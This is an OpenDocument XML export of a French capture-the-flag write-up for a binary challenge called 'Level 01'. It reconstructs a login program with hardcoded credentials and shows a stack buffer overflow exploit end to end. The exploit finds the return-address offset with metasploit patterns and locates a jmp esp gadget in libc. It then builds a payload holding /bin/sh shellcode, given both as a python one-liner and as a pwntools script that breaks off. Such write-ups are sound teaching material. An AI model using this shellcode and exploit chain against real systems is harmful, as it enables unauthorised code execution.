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E530000110FCB52D4D3.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000314E00001AC6A59FF9CA.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004D6A0000272D0CC329A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paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-style="normal" style:font-size-asian="11pt" style:font-style-asian="normal" style:font-size-complex="11pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-style="normal" style:font-size-asian="11pt" style:font-style-asian="normal" style:font-size-complex="11pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="10.5pt" fo:font-style="normal" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-size-complex="10.5pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" fo:font-style="normal" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" fo:font-style="normal" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="fals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Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-style="normal" style:font-size-asian="11pt" style:font-style-asian="normal" style:font-size-complex="11pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" style:font-name="Courier New" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="bold" style:font-size-asian="10pt" style:font-style-asian="normal" style:font-size-complex="10pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" fo:font-size="10pt" fo:font-style="normal" style:font-size-asian="10pt" style:font-style-asian="normal" style:font-size-complex="10pt"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Courier New" fo:font-size="11pt" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt"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fo:color="#19177c" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#ba2121" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#6ab825" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:color="#ed9d13"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:color="#999999" fo:font-style="italic"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:color="#3677a9"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:color="#447fcf"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:color="#447fcf" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:color="#2490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275895571507132023" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P1">Level 01</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">On reconstruit le code source :</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P11">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:span text:style-name="T8">char</text:span> <text:span text:style-name="T9">*real_uname</text:span> <text:span text:style-name="T9">=</text:span> <text:span text:style-name="T10">"dat_wil"</text:span><text:span text:style-name="T9">;<text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T11">// 0x80486a8</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T8">char</text:span> <text:span text:style-name="T9">*real_passw</text:span> <text:span text:style-name="T9">=</text:span> <text:span text:style-name="T10">"admin"</text:span><text:span text:style-name="T9">;<text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T11">// 0x80486b0</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T8">char</text:span> <text:span text:style-name="T9">a_user_name[</text:span><text:span text:style-name="T12">100</text:span><text:span text:style-name="T9">];<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T11">// 0x804a040</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:span text:style-name="T8">int</text:span> <text:s text:c="3"/><text:span text:style-name="T13">verify_user_name</text:span><text:span text:style-name="T9">(</text:span><text:span text:style-name="T8">void</text:span><text:span text:style-name="T9">)</text:span></text:p>
      <text:p text:style-name="P13">{</text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T8">int</text:span> <text:s text:c="3"/><text:span text:style-name="T9">i</text:span> <text:span text:style-name="T9">=</text:span> <text:span text:style-name="T12">0</text:span><text:span text:style-name="T9">;</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T9">puts(</text:span><text:span text:style-name="T10">"verifying username....\n"</text:span><text:span text:style-name="T9">);</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T8">while</text:span> <text:span text:style-name="T9">(real_uname[i]</text:span> <text:span text:style-name="T9">==</text:span> <text:span text:style-name="T9">a_user_name[i]</text:span> <text:span text:style-name="T9">&amp;&amp;</text:span> <text:s/><text:span text:style-name="T9">i</text:span> <text:span text:style-name="T9">&lt;</text:span> <text:span text:style-name="T12">7</text:span><text:span text:style-name="T9">)</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="8"/><text:span text:style-name="T9">i++;</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T8">if</text:span> <text:span text:style-name="T9">(i</text:span> <text:span text:style-name="T9">==</text:span> <text:span text:style-name="T12">7</text:span><text:span text:style-name="T9">)</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="8"/><text:span text:style-name="T8">return</text:span> <text:span text:style-name="T9">(</text:span><text:span text:style-name="T12">0</text:span><text:span text:style-name="T9">);</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T8">return</text:span> <text:span text:style-name="T9">(</text:span><text:span text:style-name="T12">1</text:span><text:span text:style-name="T9">);</text:span></text:p>
      <text:p text:style-name="P13">}</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:span text:style-name="T8">int</text:span> <text:s text:c="3"/><text:span text:style-name="T13">verify_user_pass</text:span><text:span text:style-name="T9">(</text:span><text:span text:style-name="T8">char</text:span> <text:span text:style-name="T9">*buff)</text:span></text:p>
      <text:p text:style-name="P13">{</text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T8">int</text:span> <text:s text:c="3"/><text:span text:style-name="T9">i</text:span> <text:span text:style-name="T9">=</text:span> <text:span text:style-name="T12">0</text:span><text:span text:style-name="T9">;</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T8">while</text:span> <text:span text:style-name="T9">(buff[i]</text:span> <text:span text:style-name="T9">==</text:span> <text:span text:style-name="T9">real_passw[i]</text:span> <text:span text:style-name="T9">&amp;&amp;</text:span> <text:span text:style-name="T9">i</text:span> <text:span text:style-name="T9">&lt;</text:span> <text:span text:style-name="T12">5</text:span><text:span text:style-name="T9">)</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="8"/><text:span text:style-name="T9">i++;</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T8">if</text:span> <text:span text:style-name="T9">(i</text:span> <text:span text:style-name="T9">==</text:span> <text:span text:style-name="T12">5</text:span><text:span text:style-name="T9">)</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="8"/><text:span text:style-name="T8">return</text:span> <text:span text:style-name="T9">(</text:span><text:span text:style-name="T12">0</text:span><text:span text:style-name="T9">);</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T8">return</text:span> <text:span text:style-name="T9">(</text:span><text:span text:style-name="T12">1</text:span><text:span text:style-name="T9">);</text:span></text:p>
      <text:p text:style-name="P13">}</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:span text:style-name="T8">int</text:span> <text:s text:c="3"/><text:span text:style-name="T13">main</text:span><text:span text:style-name="T9">(</text:span><text:span text:style-name="T8">void</text:span><text:span text:style-name="T9">)</text:span></text:p>
      <text:p text:style-name="P13">{</text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T8">int</text:span> <text:s text:c="3"/><text:span text:style-name="T9">i</text:span> <text:span text:style-name="T9">=</text:span> <text:span text:style-name="T12">0</text:span><text:span text:style-name="T9">;</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T8">char</text:span> <text:s text:c="3"/><text:span text:style-name="T9">buff[</text:span><text:span text:style-name="T12">64</text:span><text:span text:style-name="T9">];<text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T11">// [esp+0x1c]</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T8">int</text:span> <text:s text:c="3"/><text:span text:style-name="T9">n;<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T11">// [esp+0x5c]</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T8">while</text:span> <text:span text:style-name="T9">(i</text:span> <text:span text:style-name="T9">&lt;</text:span> <text:span text:style-name="T12">64</text:span><text:span text:style-name="T9">)</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="8"/><text:span text:style-name="T9">buff[i++]</text:span> <text:span text:style-name="T9">=</text:span> <text:span text:style-name="T10">'\0'</text:span><text:span text:style-name="T9">;</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T9">n</text:span> <text:span text:style-name="T9">=</text:span> <text:span text:style-name="T12">0</text:span><text:span text:style-name="T9">;</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T9">puts(</text:span><text:span text:style-name="T10">"********* ADMIN LOGIN PROMPT *********"</text:span><text:span text:style-name="T9">);</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T9">printf(</text:span><text:span text:style-name="T10">"Enter Username: "</text:span><text:span text:style-name="T9">);</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T9">fgets(a_user_name,</text:span> <text:span text:style-name="T12">0x100</text:span><text:span text:style-name="T9">,</text:span> <text:span text:style-name="T9">stdin);</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T9">n</text:span> <text:span text:style-name="T9">=</text:span> <text:span text:style-name="T9">verify_user_name();</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T8">if</text:span> <text:span text:style-name="T9">(n</text:span> <text:span text:style-name="T9">!=</text:span> <text:span text:style-name="T12">0</text:span><text:span text:style-name="T9">)</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T9">{</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="8"/><text:span text:style-name="T9">puts(</text:span><text:span text:style-name="T10">"nope, incorrect username...\n"</text:span><text:span text:style-name="T9">);</text:span></text:p>
      <text:p text:style-name="P12"><text:soft-page-break/><text:s text:c="8"/><text:span text:style-name="T8">return</text:span> <text:span text:style-name="T9">(</text:span><text:span text:style-name="T12">1</text:span><text:span text:style-name="T9">);</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T9">}</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T9">puts(</text:span><text:span text:style-name="T10">"Enter Password: "</text:span><text:span text:style-name="T9">);</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T9">fgets(buff,</text:span> <text:span text:style-name="T12">0x64</text:span><text:span text:style-name="T9">,</text:span> <text:span text:style-name="T9">stdin);</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T9">n</text:span> <text:span text:style-name="T9">=</text:span> <text:span text:style-name="T9">verify_user_pass(buff);</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T8">if</text:span> <text:span text:style-name="T9">(n</text:span> <text:span text:style-name="T9">!=</text:span> <text:span text:style-name="T12">0</text:span><text:span text:style-name="T9">)</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T9">{</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="8"/><text:span text:style-name="T9">puts(</text:span><text:span text:style-name="T10">"nope, incorrect password...\n"</text:span><text:span text:style-name="T9">);</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="8"/><text:span text:style-name="T8">return</text:span> <text:span text:style-name="T9">(</text:span><text:span text:style-name="T12">1</text:span><text:span text:style-name="T9">);</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T9">}</text:span></text:p>
      <text:p text:style-name="P12"><text:s text:c="4"/><text:span text:style-name="T8">return</text:span> <text:span text:style-name="T9">(</text:span><text:span text:style-name="T12">0</text:span><text:span text:style-name="T9">);</text:span></text:p>
      <text:p text:style-name="P10">}</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P7">Rien de très compliqué, la comparaison des chaînes pour le nom d'utilisateur et le mot de passe utilise la même méthode que décrite dans <text:span text:style-name="T1">Rainfall – level8</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2">Le programme est assez simple. On a deux potentiels </text:span><text:span text:style-name="T1">overflows</text:span><text:span text:style-name="T2"> liés aux deux appels à </text:span><text:span text:style-name="T1">fgets</text:span><text:span text:style-name="T2">. Le premier appel à fgets tente de lire 0x100 (256) bytes de stdin pour les placer dans le buffer </text:span><text:span text:style-name="T1">a_user_name</text:span><text:span text:style-name="T2"> de 0x64 (100) bytes. Cet overflow est provoqué à l'emplacement mémoire de cette variable globale statique (probablement </text:span><text:span text:style-name="T1">.bss</text:span><text:span text:style-name="T2">). Il ne semble pas extrêmement utile, car on ne peut pas vraiment overwrite quoi que ce soit d'intéressant.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2">Le second overwrite est cependant critique. En effet, on tente de lire 0x64 (</text:span><text:span text:style-name="T1">100</text:span><text:span text:style-name="T2">) bytes depuis stdin pour les placer dans le buffer </text:span><text:span text:style-name="T1">buff</text:span><text:span text:style-name="T2"> qui peut contenir 0x40 (</text:span><text:span text:style-name="T1">64</text:span><text:span text:style-name="T2">) bytes. On a donc un overflow potentiel de </text:span><text:span text:style-name="T1">36 bytes</text:span><text:span text:style-name="T2">. Étant donné qu'il n'y a pas tant de variables locales que ça, il est probable que cet overflow nous permette d'écraser l'adresse de retour.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2">On essaie de provoquer ce crash, avec donc ce second overflow. Pour qu'on puisse arriver au second prompt qui nous permet d'entrer le mot de passe et de déclencher l'overflow qui nous intéresse, il faut d'abord entrer le </text:span><text:span text:style-name="T1">username correct</text:span><text:span text:style-name="T2"> (sinon le programme quitte directement), qu'on repère dans le code désassemblé ("dat_wil"). Ainsi, on fait crash le programme de cette façon :</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7"><draw:frame draw:style-name="fr1" draw:name="images1" text:anchor-type="paragraph" svg:x="0.018cm" svg:y="0cm" svg:width="12.622cm" svg:height="6.854cm" draw:z-index="0"><draw:image xlink:href="Pictures/200000070000314E00001AC6A59FF9CA.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7">On calcule l'offset auquel on contrôle l'adresse de retour dans notre second buffer avec un <text:span text:style-name="T1">pattern metasploit</text:span><text:span text:style-name="T2"> :</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T2">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200</text:span></text:p>
      <text:p text:style-name="P5"><text:soft-page-break/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T2">/usr/share/metasploit-framework/tools/exploit/pattern_offset -q 0x37634136</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2">L'offset est à </text:span><text:span text:style-name="T1">80</text:span><text:span text:style-name="T2">. Comment va-t-on maintenant prendre contrôle du programme ? Rappelons-nous que </text:span><text:span text:style-name="T1">NX est désactivé</text:span><text:span text:style-name="T2"> ; on peut exécuter du code sur la stack. On observe l'état de la pile lorsque le programme crash.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2">On s'aperçoit qu'il nous reste </text:span><text:span text:style-name="T1">15 bytes </text:span><text:span text:style-name="T2">d'overflow après avoir écrasé l'adresse de retour. Rediriger le flux d'exécution vers un </text:span><text:span text:style-name="T1">jmp esp </text:span><text:span text:style-name="T2">nous permettrait d'exécuter ce qui se situe dans ces 15 bytes restants :</text:span></text:p>
      <text:p text:style-name="P7"><draw:frame draw:style-name="fr2" draw:name="images2" text:anchor-type="paragraph" svg:width="15.954cm" svg:height="4.367cm" draw:z-index="1"><draw:image xlink:href="Pictures/2000000700003E530000110FCB52D4D3.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7">On cherche un gadget <text:span text:style-name="T1">jmp esp</text:span><text:span text:style-name="T2"> ; on en trouve aucun dans le binaire lui-même, cependant on télécharge la </text:span><text:span text:style-name="T1">libc </text:span><text:span text:style-name="T2">qu'il utilise et on en trouve pas mal avec :</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2">ROPgadget --binary libc | grep "jmp esp"</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2">On repère l'adresse à laquelle est chargée la </text:span><text:span text:style-name="T1">libc </text:span><text:span text:style-name="T2">sur notre target grâce à </text:span><text:span text:style-name="T1">gdb </text:span><text:span text:style-name="T2">(Voir Rainfall – level2), 0xf7e2c000 ; l'offset du gadget est 0x00002a55 ; le gadget se situe donc à l'adresse :</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2">0xf7e2c000 + 0x00002a55 = 0xf7e2ea55</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2">Bref, on a notre gadget </text:span><text:span text:style-name="T1">jmp esp</text:span><text:span text:style-name="T2">. Que veut-on exécuter dans les 15 bytes d'overflow qui nous reste ? On a pensé d'abord faire comme pour le challenge </text:span><text:span text:style-name="T1">HackTheBox – Space </text:span><text:span text:style-name="T2">(utiliser un </text:span><text:span text:style-name="T1">stagger</text:span><text:span text:style-name="T2"> pour déclencher en 14 bytes la lecture et l'exécution d'un payload entré par stdin), cela ne fonctionnait cependant pas vraiment.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2">Une solution plus simple existe. Lorsque le programme crash, juste au-dessus en mémoire de </text:span><text:span text:style-name="T1">esp</text:span><text:span text:style-name="T2"> on a notre buffer qui a overflow sur l'adresse de retour :</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7"><draw:frame draw:style-name="fr3" draw:name="images3" text:anchor-type="paragraph" svg:width="18.149cm" svg:height="9.185cm" draw:z-index="2"><draw:image xlink:href="Pictures/2000000700004D6A0000272D0CC329A3.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2">(NOTE : on voit un 0xffffffff au milieu du buffer, il s'agit simplement de la variable </text:span><text:span text:style-name="T1">n</text:span><text:span text:style-name="T2"> qui est modifiée suite à l'overflow et qui écrase donc les 0x42424242 qui s'y situaient).</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2">Lorsque le programme crash, </text:span><text:span text:style-name="T1">esp se situe 0x54 bytes plus bas que le début de buff </text:span><text:span text:style-name="T2">(ici par exemple </text:span><text:span text:style-name="T3">0xffffd1f0</text:span><text:span text:style-name="T2"> pour esp, buff commence à </text:span><text:span text:style-name="T3">0xffffd19c</text:span><text:span text:style-name="T2">, 0x54 bytes d'écart). Le plan est donc le suivant :</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2">&gt; Rediriger le flux d'exécution vers un </text:span><text:span text:style-name="T1">jmp esp</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2">&gt; Exécuter, dans les 15 bytes à notre disposition, les instructions :</text:span></text:p>
      <text:list xml:id="list3750189080282311696" text:style-name="L2">
        <text:list-item>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P4"><text:span text:style-name="T2">sub esp,0x54</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P4"><text:span text:style-name="T2">jmp esp</text:span></text:p>
              <text:p text:style-name="P4"><text:span text:style-name="T2">==&gt; '\x83\xec\x54\xff\xe4'</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P7"><text:span text:style-name="T2">&gt; EIP se situera donc au début de notre buffer, qui contiendra le shellcode.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2">Le payload (envoyé en second, dans le prompt password) aura cette structure :</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2">[SHELLCODE 28 bytes] + ['B' * 52] + [JMP ESP gadget addr] + [SUB ESP,0x54; JMP ESP]</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2">&gt;&gt; </text:span><text:span text:style-name="T5">Exploitation manuelle</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Comme pour <text:span text:style-name="T1">Rainfall – bonus0 </text:span><text:span text:style-name="T2">on a ici plusieurs entrées </text:span><text:span text:style-name="T1">stdin </text:span><text:span text:style-name="T2">demandées à l'utilisateur ; ce qui complique un peu les choses pour fournir les inputs. On utilise la même méthode (même si ici, </text:span><text:span text:style-name="T1">fgets</text:span><text:span text:style-name="T2"> est utilisé au lieu de call </text:span><text:span text:style-name="T1">read</text:span><text:span text:style-name="T2">) : on remplit entièrement le buffer du premier appel à fgets, puis on ajoute notre second input. Le premier appel à fgets prendra le premier buffer ; il restera cependant le reste de notre input dans le buffer, que le second call prendra.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">$ </text:span><text:span text:style-name="T2">python -c </text:span><text:span text:style-name="T7">"print('dat_wil' +</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T7">'A' * 248 +</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T7">'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' +</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T7">'B' * (52) +</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T7">'\x55\xea\xe2\xf7' +</text:span></text:p>
      <text:p text:style-name="P9"><text:soft-page-break/><text:span text:style-name="T7">'\x83\xec\x54\xff\xe4')"</text:span><text:span text:style-name="T2"> &gt; /tmp/payload</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P9">$ cat /tmp/payload - | ./level01</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">&gt;&gt; <text:span text:style-name="T4">Exploit automatique</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P14"><text:span text:style-name="T8">from</text:span> <text:span text:style-name="T14">pwn</text:span> <text:span text:style-name="T8">import</text:span> <text:span text:style-name="T9">*</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:span text:style-name="T9">shellcode</text:span> <text:s text:c="2"/><text:span text:style-name="T9">=</text:span> <text:span text:style-name="T9">b</text:span><text:span text:style-name="T10">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T9">payload_1</text:span> <text:s text:c="2"/><text:span text:style-name="T9">=</text:span> <text:span text:style-name="T9">b</text:span><text:span text:style-name="T10">'dat_wil'</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T9">payload_2</text:span> <text:s text:c="2"/><text:span text:style-name="T9">=</text:span> <text:span text:style-name="T9">shellcode</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T9">payload_2</text:span> <text:s text:c="2"/><text:span text:style-name="T9">+=</text:span> <text:span text:style-name="T9">b</text:span><text:span text:style-name="T10">'B'</text:span> <text:span text:style-name="T9">*</text:span> <text:span text:style-name="T9">(</text:span><text:span text:style-name="T12">80</text:span> <text:span text:style-name="T9">-</text:span> <text:span text:style-name="T15">len</text:span><text:span text:style-name="T9">(shellcode))</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T9">payload_2</text:span> <text:s text:c="2"/><text:span text:style-name="T9">+=</text:span> <text:span text:style-name="T9">b</text:span><text:span text:style-name="T10">'\x55\xea\xe2\xf7'</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T9">payload_2</text:span> <text:s text:c="2"/><text:span text:style-name="T9">+=</text:span> <text:span text:style-name="T9">b</text:span><text:span text:style-name="T10">'\x83\xEC\x54\xFF\xE4'</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"/>
